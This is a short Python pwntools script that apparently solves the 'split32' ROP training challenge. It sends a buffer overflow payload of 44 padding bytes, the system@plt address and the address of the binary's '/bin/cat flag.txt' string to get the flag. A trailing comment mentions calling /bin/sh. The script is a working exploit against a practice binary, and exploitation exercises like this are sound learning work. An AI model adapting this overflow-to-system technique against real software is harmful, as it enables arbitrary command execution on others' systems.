#!/usr/bin/env python
from pwn import *

s = process('./split32')
s.recvuntil('>')

padding = 44

elf = ELF('split32')
system_plt = elf.plt['system']
print 'system_plt =', hex(system_plt)

bin_cat_flag = next(elf.search('/bin/cat flag.txt'))
print 'bin_cat_flag =', hex(bin_cat_flag)

payload = 'A' * padding
payload += p32(system_plt)
payload += 'FAKE'      # fake return address
payload += p32(bin_cat_flag)

s.sendline(payload)
s.interactive()

# trying to call /bin/sh
# (PIE: Disabled) - that means that the binary will always be loaded at the same place in memory








